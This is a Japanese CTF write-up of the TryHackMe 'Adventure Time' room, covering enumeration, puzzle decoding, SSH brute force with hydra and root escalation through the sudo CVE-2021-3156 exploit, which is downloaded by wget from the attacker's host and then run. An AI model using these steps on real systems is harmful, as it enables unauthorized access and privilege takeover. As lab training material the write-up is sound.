# Adventure Time CTF

https://tryhackme.com/room/adventuretime

## Enumeration

```shell
TARGET=10.146.130.34
sudo bash -c "echo $TARGET   adventure-time.com land-of-ooo.com >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack ttl 64
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
443/tcp   open  https   syn-ack ttl 64
31337/tcp open  Elite   syn-ack ttl 64
```

```sh
sudo nmap -sV -p21,22,80,443,31337 $TARGET

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.29
443/tcp   open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
31337/tcp open  Elite?
```

FTP, SSH, HTTP, HTTPS

```sh
root@ip-10-144-125-15:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.144.185.152
+ Target Hostname:    adv.thm
+ Target Port:        80
+ Start Time:         2026-04-10 02:28:40 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ 1707 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-04-10 02:28:42 (GMT1) (2 seconds)
---------------------------------------------------------------------------
```

HTTPS証明書

```
adventure-time.com
bubblegum@land-of-ooo.com
```

## FTP

jpgファイルが6個。stegseekをかけたが何も出なかった。

```sh
ftp> ls -al
229 Entering Extended Passive Mode (|||46414|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 21  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Sep 21  2019 ..
-r--r--r--    1 ftp      ftp       1401357 Sep 21  2019 1.jpg
-r--r--r--    1 ftp      ftp        233977 Sep 21  2019 2.jpg
-r--r--r--    1 ftp      ftp        524615 Sep 21  2019 3.jpg
-r--r--r--    1 ftp      ftp        771076 Sep 21  2019 4.jpg
-r--r--r--    1 ftp      ftp       1644395 Sep 21  2019 5.jpg
-r--r--r--    1 ftp      ftp         40355 Sep 21  2019 6.jpg
226 Directory send OK.
```

### サブドメイン、VHOST

サブドメインは見つからなかった。

```shell
ffuf -u https://adventure-time.com -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.adventure-time.com' -fs 216
```

### ディレクトリ列挙

https で /candybar を発見。

```sh
root@ip-10-144-125-15:~# gobuster dir -q -x=txt,php -u https://adventure-time.com/ -w ./dirlist.txt -t 64 -k
/.php                 (Status: 403) [Size: 298]
/candybar             (Status: 301) [Size: 329]
```

## /candybar

`Where is Jake?`

https://adventure-time.com/candybar/ にアクセスしたら画像が表示された。

Base32デコード、Vigene復号（キーはP）すると下記のメッセージになった。

```
Always check the SSL certificate for clues
```

## /yellowdog

メッセージをヒントに、land-of-ooo.com を列挙したら /yellowdog を発見。

```sh
root@ip-10-144-125-15:~# gobuster dir -q -x=txt,php -u https://land-of-ooo.com/ -w ./dirlist.txt -t 64 -k
...
/yellowdog            (Status: 301) [Size: 322]
```

http://land-of-ooo.com/yellowdog/ に転送されるが、404。

```sh
root@ip-10-144-125-15:~# gobuster dir -q -x=txt -u https://land-of-ooo.com/yellowdog/ -w ./dirlist.txt -t 64 -k
/bananastock          (Status: 301) [Size: 334] 
```

## /yellowdog/bananastock

`Those banana guards are not really smart`

`Jake が言ったようにパスワード変えた？` に対するバナナの返答。

```
_/..../.\_.../._/_./._/_./._/...\._/._./.\_/..../.\_..././.../_/_._.__/_._.__/_._.__
```

モールスとして解釈するとこうなる。

```
THE BANANAS ARE THE BEST!!!
```

```sh
root@ip-10-144-125-15:~# gobuster dir -q -x=txt -u https://land-of-ooo.com/yellowdog/bananastock/ -w ./dirlist.txt -t 64 -k
...
/princess             (Status: 301) [Size: 343]
```

## /yellowdog/bananastock/princess

```html
    <!--
    Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
    Key = [REDACTED]
    IV = abcdefghijklmanopqrstuvwxyz
    Mode = CBC
    Input = hex
    Output = raw
    -->
```

これをCyberchefで復号すると下記のメッセージになった。

```
the magic safe is accessibel at port 31337. the magic word is: [REDACTED]
```

この階層以上は何も出なかった。

```sh
root@ip-10-144-125-15:~# gobuster dir -q -x=txt -u https://land-of-ooo.com/yellowdog/bananastock/princess/ -w ./dirlist.txt -t 64 -k
```

## 31337 port

```sh
$ nc $TARGET 31337
Hello Princess Bubblegum. What is the magic word?
[REDACTED]
The new username is: apple-guards
```

`THE BANANAS ARE THE BEST!!!` をパスワードとしてSSH接続できるようになった。

## SSH

```sh
apple-guards@at:~$ ls -al
total 48
drwxr-x---  4 apple-guards apple-guards 4096 sep 23  2019 .
drwxr-xr-x 10 root         root         4096 sep 20  2019 ..
-rw-------  1 apple-guards apple-guards   11 sep 23  2019 .bash_history
-rw-r--r--  1 apple-guards apple-guards  220 apr  4  2018 .bash_logout
-rw-r--r--  1 apple-guards apple-guards 3771 apr  4  2018 .bashrc
drwx------  2 apple-guards apple-guards 4096 sep 20  2019 .cache
-rw-r-----  1 apple-guards apple-guards   30 sep 22  2019 flag1
-rw-r--r--  1 apple-guards apple-guards   59 sep 20  2019 flag.txt
drwx------  3 apple-guards apple-guards 4096 sep 20  2019 .gnupg
-rw-------  1 apple-guards apple-guards  711 sep 21  2019 mbox
-rw-r--r--  1 apple-guards apple-guards  807 apr  4  2018 .profile
-rw-------  1 apple-guards apple-guards  713 sep 21  2019 .viminfo
```

flag.txt の内容は？？

```sh
apple-guards@at:~$ cat flag1
tryhackme{[REDACTED]}

apple-guards@at:~$ cat flag.txt
Good job!!!!


tryhackme{2e37796b2bd0eae4b20c36cb359610ad}
```

## flag2

```sh
apple-guards@at:~$ cat mbox
From marceline@at  Fri Sep 20 16:39:54 2019
Return-Path: <marceline@at>
X-Original-To: apple-guards@at
Delivered-To: apple-guards@at
Received: by at.localdomain (Postfix, from userid 1004)
        id 6737B24261C; Fri, 20 Sep 2019 16:39:54 +0200 (CEST)
Subject: Need help???
To: <apple-guards@at>
X-Mailer: mail (GNU Mailutils 3.4)
Message-Id: <20190920143954.6737B24261C@at.localdomain>
Date: Fri, 20 Sep 2019 16:39:54 +0200 (CEST)
From: marceline@at

Hi there bananaheads!!!
I heard Princess B revoked your access to the system. Bummer!
But I'll help you guys out.....doesn't cost you a thing.....well almost nothing.

I hid a file for you guys. If you get the answer right, you'll get better access.
Good luck!!!!
```

```sh
apple-guards@at:~$ ls -al /home
total 40
drwxr-xr-x 10 root              root              4096 sep 20  2019 .
drwxr-xr-x 23 root              root              4096 sep 18  2019 ..
drwxr-x---  4 apple-guards      apple-guards      4096 sep 23  2019 apple-guards
drwxr-x--- 18 bubblegum         bubblegum         4096 sep 23  2019 bubblegum
drwxr-x---  2 fern              fern              4096 sep 18  2019 fern
drwxr-x---  2 finn              finn              4096 sep 18  2019 finn
drwxr-x---  4 gunter            gunter            4096 sep 23  2019 gunter
drwxr-x---  2 jake              jake              4096 sep 18  2019 jake
drwxr-x---  4 marceline         marceline         4096 sep 23  2019 marceline
drwxr-x---  4 peppermint-butler peppermint-butler 4096 sep 23  2019 peppermint-butler
```

不自然なファイルを発見

```sh
apple-guards@at:~$ ls -al /etc/fonts/helper
-rwxr-x--- 1 marceline apple-guards 16616 sep 20  2019 /etc/fonts/helper
```

実行

```sh
======================================
      BananaHead Access Pass          
       created by Marceline           
======================================

Hi there bananaheads!!!
So you found my file?
But it won't help you if you can't answer this question correct.
What? I told you guys I would help and that it wouldn't cost you a thing....
Well I lied hahahaha

Ready for the question?

The key to solve this puzzle is gone
And you need the key to get this readable: Gpnhkse

Did you solve the puzzle? 
```

Ghidraで見たらシェルスクリプトを実行していた。

```c
undefined8 main(void)
{
  system("/usr/share/misc/guard.sh");
  return 0;
}
```

このシェルファイルを開くと、パスワードが平文で出ていた。

marceline でSSH接続してフラグ２を回収。

## flag3

```sh
marceline@at:~$ cat I-got-a-secret.txt
Hello Finn,

I heard that you pulled a fast one over the banana guards.
B was very upset hahahahaha.
I also heard you guys are looking for BMO's resetcode.
You guys broke him again with those silly games?

You know I like you Finn, but I don't want to anger B too much.
So I will help you a little bit...

But you have to solve my little puzzle. Think you're up for it?
Hahahahaha....I know you are.

111111111100100010[REDACTED]
```

spoon言語としてプログラム実行すると、下記のメッセージ。

```
The magic word you are looking for is [REDACTED]
```

31337 ポートでマジックワードを入力するとパスワードが表示された。

```sh
$ nc $TARGET 31337                                                                           
Hello Princess Bubblegum. What is the magic word?
[REDACTED]
The password of peppermint-butler is: [REDACTED]
```

SSH接続してフラグ3を回収。

## flag4

気になるファイルが3つ。（抜粋）

```sh
peppermint-butler@at:~$ find / -group peppermint-butler -type f -not -path "/proc/*" 2>/dev/null
/usr/share/xml/steg.txt
/etc/php/zip.txt
/home/peppermint-butler/butler-1.jpg
```

```sh
peppermint-butler@at:~$ cat /usr/share/xml/steg.txt
I need to keep my secrets safe.
There are people in this castle who can't be trusted.
Those banana guards are not the smartest of guards.
And that Marceline is a friend of princess Bubblegum,
but I don't trust her.

So I need to keep this safe.

The password of my secret file is 'ToKeepASecretSafe'
```

ほぼ同じ内容だが、パスワードが異なる。

```sh
peppermint-butler@at:~$ cat /etc/php/zip.txt
I need to keep my secrets safe.
There are people in this castle who can't be trusted.
Those banana guards are not the smartest of guards.
And that Marceline is a friend of princess Bubblegum,
but I don't trust her.

So I need to keep this safe.

The password of my secret file is 'ThisIsReallySave'
```

画像ファイルから、１つめのパスワードを使ってzipファイルを得た。

```sh
$ steghide --extract -sf ./butler-1.jpg
Enter passphrase: 
wrote extracted data to "secrets.zip".
```

２つめのパスワードを使って展開。

```sh
$ unzip ./secrets.zip 
Archive:  ./secrets.zip
[./secrets.zip] secrets.txt password: 
 extracting: secrets.txt
```

```sh
$ cat secrets.txt
[0200 hours][upper stairs]
I was looking for my arch nemesis Peace Master, 
but instead I saw that cowering little puppet from the Ice King.....gunter.
What was he up to, I don't know.
But I saw him sneaking in the secret lab of Princess Bubblegum.
To be able to see what he was doing I used my spell 'the evil eye' and saw him.
He was hacking the secret laptop with something small like a duck of rubber.
I had to look closely, but I think I saw him type in something.
It was unclear, but it was something like 'The Ice King s????'.
The last 4 letters where a blur.

Should I tell princess Bubblegum or see how this all plays out?
I don't know.......
```

sから始まる５文字のリストを作成

```sh
$ cat /usr/share/wordlists/rockyou.txt | grep '^s....$' > s_list.txt
```

パスワードリスト作成

```sh
$ cat ./s_list.txt | sed 's/^/The Ice King /' > s_pass.txt
```

ブルートフォース成功

```sh
$ hydra -l gunter -P ./s_pass.txt $TARGET ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-10 02:25:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 11472 login tries (l:1/p:11472), ~383 tries per task
[DATA] attacking ssh://10.146.190.232:22/
[22][ssh] host: 10.146.190.232   login: gunter   password: The Ice King s[REDACTED]
```

ログインしてフラグ４回収。

## flag5

gccグループは気になる。

```sh
gunter@at:~$ id
uid=1007(gunter) gid=1007(gunter) groups=1007(gunter),1012(gcc)
```

```sh
gunter@at:~$ find / -group gcc -type f -not -path "/proc/*" 2>/dev/null
/usr/bin/gcc-5
gunter@at:~$ ls -al /usr/bin/gcc-5
-rwxr-x--- 1 root gcc 915704 apr 13  2016 /usr/bin/gcc-5
```

普通にコンパイルできたのでコンパイラではあると思われる。コンパイルが必要な脆弱性があるか？

```sh
gunter@at:~$ /usr/bin/gcc-5 -o foo foo.c
gunter@at:~$ ls
flag4  foo  foo.c
```

この脆弱性は調査する価値があるかもしれない。

```sh
gunter@at:~$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
malloc(): memory corruption
Aborted (core dumped)
```

なんと成功した。

```sh
gunter@at:~$ wget http://192.168.128.106:8000/cve.tar.gz
--2026-04-10 08:35:01--  http://192.168.128.106:8000/cve.tar.gz
Connecting to 192.168.128.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17886 (17K) [application/gzip]
Saving to: ‘cve.tar.gz’

cve.tar.gz                   100%[=============================================>]  17,47K  --.-KB/s    in 0,1s    

2026-04-10 08:35:01 (144 KB/s) - ‘cve.tar.gz’ saved [17886/17886]

gunter@at:~$ tar -xzf cve.tar.gz
gunter@at:~$ cd CVE-2021-3156
gunter@at:~/CVE-2021-3156$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
gunter@at:~/CVE-2021-3156$ ls
Dockerfile  exploit  exploit.c  libnss_x  Makefile  README.md  shellcode.c
gunter@at:~/CVE-2021-3156$ ./exploit
# id
uid=0(root) gid=0(root) groups=0(root),1007(gunter),1012(gcc)
```

flag5は・・・？

```sh
# ls -al /root
total 28
drwx------  4 root root 4096 Sep 22  2019 .
drwxr-xr-x 23 root root 4096 Sep 18  2019 ..
-rw-------  1 root root  848 Sep 22  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr 26  2018 .cache
drwxr-xr-x  3 root root 4096 Sep 18  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
```

historyを見たら、フラグ１から４までを設定した形跡。

```sh
# cat /root/.bash_history
sudo echo 'tryhackme{[REDACTED]}' > /home/apple-guards/flag1 && chown apple-guards:apple-guards /home/apple-guards/flag1
sudo echo 'tryhackme{[REDACTED]}' > /home/marceline/flag2 && chown marceline:marceline /home/marceline/flag2
sudo echo 'tryhackme{[REDACTED]}' > /home/peppermint-butler/flag3 && chown peppermint-butler:peppermint-butler /home/peppermint-butler/flag3
sudo echo 'tryhackme{[REDACTED]!}' > /home/gunter/flag4 && chown gunter:gunter /home/gunter/flag4
ls -laRh /home
ls -laRh /home | \grep flag*
ls -laRh /home | \grep -e 'flag[0-9]'
find /home -iname "flag[0-9]"
find /home -iname "flag[0-9]" -exec chmod 640 {} \;
find /home -iname "flag[0-9]"
ls -laRh /home | \grep -e 'flag[0-9]'
find /home -iname "flag[0-9]" -exec cat {} \;
cd
ls -lah
rm .bash_history 
ls -lah
cat /home/bubblegum/Secrets/bmo.txt 
poweroff
```

フラグ５発見！

```sh
# cat /home/bubblegum/Secrets/bmo.txt
```

## 振り返り

- 0,1のみで構成されるspoon言語を初めて知った。覚えておきたい。
- sudo の脆弱性を攻撃するこのエクスプロイトはCTFでたまにチャレンジするが、成功したのは初めてかもしれない。

## Tags

#tags:puzzle #tags:spoon言語 #tags:sudo脆弱性
